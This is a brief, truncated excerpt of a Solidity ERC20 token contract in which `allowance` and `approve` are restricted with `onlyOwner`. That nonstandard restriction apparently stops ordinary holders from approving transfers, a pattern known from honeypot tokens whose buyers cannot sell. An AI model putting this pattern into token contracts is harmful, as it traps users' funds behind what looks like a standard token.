...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function allowance(address owner, address spender) public onlyOwner view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public onlyOwner virtual override returns (bool) {
        address owner = _msgSender();
